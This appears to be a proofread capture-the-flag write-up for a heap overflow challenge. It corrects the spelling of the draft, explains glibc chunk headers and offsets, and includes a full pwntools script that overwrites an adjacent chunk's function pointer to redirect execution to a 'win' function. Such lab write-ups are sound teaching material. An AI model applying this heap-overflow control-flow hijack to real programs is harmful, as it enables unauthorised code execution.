### Spelling & Grammar Corrections

| Original Text / Typo | Corrected Version | Explanation |
| --- | --- | --- |
| `MISS SPECLLYING` | Spelling errors / typos | Correction of spelling. |
| `the acquire allocated a object` | `acquire()` allocates an object | Article agreement and function naming. |
| `initialized it function pointer` | initialized **its** function pointer | Possessive pronoun. |
| `our interest rize in the fact` | Our interest **arises** from the fact | Correct verb usage. |
| `how we can do that ?` | How **can we** do that? | Interrogative word order. |
| `tack a look` | **Take** a look | Spelling. |
| `no matter what the size cause...` | regardless of size because bounds checking is missing | Technical tone and clarity. |
| `what this mean to us` | What this **means for** us | Subject-verb agreement. |
| `malloca` | `malloc` | Typo in function name. |
| `AMP-flags` | `A | M |
| `for use to overrite` | For **us** to **overwrite** | Spelling and pronoun. |
| `just tp reach` | just **to** reach | Typo. |

---

### Key Technical Concepts & Clarifications

1. **Heap Allocation Order & Direction**:
When `malloc` allocates Chunk A (`slot 0`) and Chunk B (`slot 1`) sequentially, **Chunk A resides at a lower memory address than Chunk B**. A linear heap overflow in Chunk A writes forward in memory into Chunk B. In your diagram, swap the positions so Chunk A is shown first (at lower memory addresses) and Chunk B follows it at higher memory addresses:

```txt
[ Lower Address ]
+-------------------------------------------------------+
| Chunk A Header & Data (piece_t @ slot 0)              |
|  - render (8 bytes) @ +0                              |
|  - title[40] (40 bytes) @ +8                          |
+-------------------------------------------------------+
| Chunk B Header (16 bytes)                             |
|  - prev_size (8 bytes)                                |
|  - size | A|M|P flags (8 bytes)                       |
+-------------------------------------------------------+
| Chunk B Data (piece_t @ slot 1)                       |
|  - render (8 bytes)  <-- Target overwrite location    |
|  - title[40] (40 bytes)                               |
+-------------------------------------------------------+
[ Higher Address ]

```

2. **Structure Offsets & Offset Calculation**:
* `piece_t` structure layout (assuming 64-bit architecture):
* Offset `0x00`: `render` function pointer (8 bytes).
* Offset `0x08`: `title` array (40 bytes).


* Writing to `gallery[0]->title` starts at **offset +8** inside Chunk A's data area.
* Distance to reach Chunk B's function pointer:
* Remaining `title` buffer in Chunk A: **40 bytes** ($48 - 8$).
* Chunk B `prev_size` header field: **8 bytes**.
* Chunk B `size` header field: **8 bytes**.
* Total offset to Chunk B's `render` pointer: $40 + 8 + 8 = 56$ **bytes**.


* Writing 8 bytes for `p64(leaked_win)` at offset 56 completes the **64-byte payload**.


3. **Glibc Heap Metadata (`A|M|P` Flags)**:
* The lowest 3 bits of glibc heap chunk size fields represent metadata flags:
* **`P` (`PREV_INUSE`, 0x1)**: Set if the preceding chunk (Chunk A) is currently allocated.
* **`M` (`IS_MMAPPED`, 0x2)**: Set if the chunk was allocated using `mmap`.
* **`A` (`NON_MAIN_ARENA`, 0x4)**: Set if the chunk belongs to a non-main arena.


* Setting `chunk_b_size = 48 | 0x1` (`0x31`) preserves the size (`0x30`) and ensures the `PREV_INUSE` bit remains `1`.



---

### Revised & Refined Writeup Text

In this binary, the program allows the user to interact with an array of pointers (`gallery`) storing objects of type `piece_t`:

```c
typedef struct piece_s {
    void (*render)(struct piece_s *);
    char title[TITLE_SIZE];
} piece_t;

```

#### 1. Vulnerability Analysis

When calling `acquire()`, the program allocates a `piece_t` object using `malloc(sizeof(piece_t))` and initializes its `render` function pointer to `show_title`.

In `annotate()`, the program prompts for a length `n` and reads input directly into `gallery[i]->title`:

```c
read(STDIN_FILENO, gallery[i]->title, n);

```

Crucially, `n` is user-controlled and unbounded. Because no bounds check validates `n` against `TITLE_SIZE` (40 bytes), an unbounded heap buffer overflow exists.

#### 2. Exploit Strategy

On a 64-bit architecture, `sizeof(piece_t)` is 48 bytes (8-byte `render` function pointer + 40-byte `title` buffer). When two consecutive chunks (A and B) are allocated via `malloc`, Chunk A sits at a lower memory address than Chunk B.

To hijack control flow:

1. Allocate Chunk A (`slot 0`) and Chunk B (`slot 1`).
2. Calculate the payload size starting from `gallery[0]->title` (offset +8 in Chunk A):
* **40 bytes**: Fill the remainder of Chunk A's `title` array.
* **8 bytes**: Overwrite Chunk B's `prev_size` header field.
* **8 bytes**: Overwrite Chunk B's `size` header field (preserving size `0x30` with `PREV_INUSE` set $\rightarrow$ `0x31`).
* **8 bytes**: Overwrite Chunk B's `render` function pointer with the address of `win`.


3. Total payload length: **64 bytes**.
4. Invoke `display()` on `slot 1` (`gallery[1]`). The program executes `gallery[1]->render(gallery[1])`, redirecting execution flow to `win`.

#### 3. Exploit Payload

```py
p = connect()

p.recvline(timeout=TIMEOUT)
p.recvline(timeout=TIMEOUT)
recv = p.recvline(timeout=TIMEOUT).strip()

# Leak win function address
leaked_win = int(recv[len(b'\x1b[0m[MARLY] curator @ '):], 16)

# 1. Allocate Chunk A (slot 0)
p.recvuntil(b"> ")
p.send(b'1')
p.recvuntil(b'slot: ')
p.send(b'0')

# 2. Allocate Chunk B (slot 1)
p.recvuntil(b"> ")
p.send(b'1')
p.recvuntil(b'slot: ')
p.send(b'1')

# 3. Overflow Chunk A into Chunk B's header and render pointer
p.recvuntil(b'> ')
p.send(b'2')
p.recvuntil(b"slot: ")
p.send(b'0')
p.recvuntil(b"len: ")
p.send(b'64')
p.recvuntil(b"text: ")

chunk_b_size = 48 | 0x1  # 0x31 (size 0x30 + PREV_INUSE flag)
payload = b'A' * 40 + b'\x00' * 8 + p64(chunk_b_size) + p64(leaked_win)
p.send(payload)

# 4. Trigger execution via display on slot 1
p.recvuntil(b'> ')
p.send(b'3')
p.recvuntil(b'slot: ')
p.send(b'1')

p.interactive()

```